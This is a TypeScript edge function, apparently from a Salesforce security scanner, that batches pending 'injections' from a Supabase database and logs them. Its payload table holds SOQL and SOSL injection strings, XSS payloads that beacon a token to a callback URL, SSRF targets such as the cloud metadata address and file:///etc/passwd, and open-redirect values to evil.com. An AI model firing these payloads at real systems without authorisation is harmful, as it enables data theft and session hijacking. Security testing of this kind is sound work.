import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Salesforce-specific payload templates
const SALESFORCE_PAYLOADS = {
  soql_injection: [
    "' OR '1'='1",
    "' OR Name LIKE '%",
    "') OR (Id != null AND Id != '",
    "' UNION SELECT Id, Name FROM Account--",
    "\\' OR Id != null--",
  ],
  sosl_injection: [
    "test}] OR [FIND {*",
    "test*}] IN ALL FIELDS RETURNING Account(Id, Name, (SELECT Id FROM Contacts))--",
  ],
  aura_component: [
    '{"actions":[{"descriptor":"apex://CustomController/ACTION$getData","params":{}}]}',
    '{"actions":[{"descriptor":"serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue","params":{"html":"<img src=x onerror=alert(1)>"}}]}',
  ],
  lightning_xss: [
    '<img src=x onerror="fetch(\'CALLBACK_URL?token=TOKEN\')">',
    '<svg onload="new Image().src=\'CALLBACK_URL?token=TOKEN\'">',
    '"><script src="CALLBACK_URL?token=TOKEN"></script>',
    'javascript:fetch("CALLBACK_URL?token=TOKEN")',
  ],
  sharing_bypass: [
    '{"recordId":"001000000000001","bypassSharing":true}',
  ],
  ssrf: [
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:8080/admin',
    'file:///etc/passwd',
  ],
  open_redirect: [
    '//evil.com',
    '/\\evil.com',
    'https://evil.com?',
  ],
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const body = await req.json().catch(() => ({}));
    const { batchSize = 20, vulnTypeFilter } = body;

    // Get pending injections with optional filter
    let query = supabase
      .from('injections')
      .select('*, endpoints(*, targets(*))')
      .eq('status', 'pending')
      .limit(batchSize);

    if (vulnTypeFilter) {
      query = query.eq('context_type', vulnTypeFilter);
    }

    const { data: pendingInjections, error: injectionsError } = await query;

    if (injectionsError) throw injectionsError;

    console.log(`Processing ${pendingInjections?.length || 0} pending injections`);

    const results = {
      processed: 0,
      skipped: 0,
      errors: 0,
      details: [] as { token: string; status: string; vulnType: string }[]
    };

    for (const injection of pendingInjections || []) {
      try {
        const vulnType = injection.context_type || 'unknown';
        const endpoint = injection.endpoints;
        const target = endpoint?.targets;

        // Generate appropriate payload for the vulnerability type
        const payloads = SALESFORCE_PAYLOADS[vulnType as keyof typeof SALESFORCE_PAYLOADS] || [];
        const selectedPayload = payloads[Math.floor(Math.random() * Math.max(1, payloads.length))];

        // Update injection status to injected
        await supabase
          .from('injections')
          .update({ 
            status: 'injected',
            injected_at: new Date().toISOString()
          })
          .eq('id', injection.id);

        // Update endpoint status
        await supabase
          .from('endpoints')
          .update({ status: 'testing' })
          .eq('id', injection.endpoint_id);

        // Log the injection with details
        if (target?.id) {
          await supabase.from('scan_logs').insert({
            target_id: target.id,
            level: 'info',
            message: `💉 Injecting ${vulnType} probe into ${endpoint?.endpoint} | Param: ${injection.param} | Token: ${injection.token}`
          });

          if (selectedPayload) {
            await supabase.from('scan_logs').insert({
              target_id: target.id,
              level: 'info',
              message: `📝 Payload template: ${selectedPayload.substring(0, 60)}${selectedPayload.length > 60 ? '...' : ''}`
            });
          }
        }

        results.processed++;
        results.details.push({
          token: injection.token,
          status: 'injected',
          vulnType
        });

      } catch (injError) {
        console.error('Error processing injection:', injError);
        results.errors++;
        results.details.push({
          token: injection.token,
          status: 'error',
          vulnType: injection.context_type || 'unknown'
        });
      }
    }

    // Summary log
    if (pendingInjections?.length && pendingInjections[0]?.endpoints?.targets?.id) {
      await supabase.from('scan_logs').insert({
        target_id: pendingInjections[0].endpoints.targets.id,
        level: 'success',
        message: `✅ Injection batch complete: ${results.processed} processed | ${results.skipped} skipped | ${results.errors} errors`
      });
    }

    return new Response(
      JSON.stringify({ success: true, ...results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Injection processing error:', error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : 'Unknown error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
